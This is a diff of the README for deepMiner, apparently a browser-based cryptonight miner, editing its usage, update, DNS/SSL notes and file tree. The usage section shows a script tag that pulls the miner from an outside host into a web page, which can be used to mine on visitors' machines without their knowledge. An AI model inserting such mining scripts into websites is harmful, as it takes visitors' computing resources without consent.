@@ -19,9 +19,7 @@
 
 ## Usage
 
-* Add a script inmport `https://deepc.cc/deepMiner.js`
-
-* Add another script and write down :
+* Add some javascript and write like this :
 
 ```html
 <script src="https://deepc.cc/deepMiner.js"></script>
@@ -47,11 +45,17 @@ ssl support: <https://certbot.eff.org/>
 
 OS pass: `ubuntu(debian)`
 
+## Update
+
+Just go `/srv/deepMiner` and run `git pull`
+
+DON'T forget backup your `config.json` !!!
+
 ## attention
 
-Some VPS's dns can't find DNS for pool host. Check your setting if it's wrong.
+Some VPS's default DNS can't find IP for the pool. Check your DNS setting if it's wrong.
 
-SSL cert request default TRUE. Use `certbot` set it up.
+SSL cert request default TRUE. Use `certbot` to quickly set it.
 
 ## Example
 
@@ -75,6 +79,7 @@ deepMiner.git
     |-- index.html
     |-- lib
     |   |-- cryptonight-asmjs.min.js
+    |   |-- cryptonight-asmjs.min.js.mem
     |   |__ cryptonight.wasm
     |__ worker.js
 ```
